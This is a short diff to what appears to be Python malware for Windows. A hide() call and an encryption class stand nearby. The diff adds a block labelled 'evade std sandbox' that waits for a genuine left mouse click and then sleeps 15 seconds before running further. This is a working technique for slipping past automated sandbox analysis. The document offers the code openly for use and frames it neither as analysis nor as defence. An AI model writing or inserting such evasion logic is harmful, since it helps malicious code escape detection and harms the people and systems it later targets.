@@ -12,6 +12,18 @@ def hide():
     return True
 hide()
 
+##### evade std sandbox
+
+state_left = win32api.GetKeyState(0x01)
+while True:
+    a = win32api.GetKeyState(0x01)
+    if a != state_left:
+        state_left = a
+        if a >= 0:
+            time.sleep(15)
+            break
+    time.sleep(0.1)
+
 class PKCS7Encoder():
     class InvalidBlockSizeError(Exception):
         """Raised for invalid block sizes"""
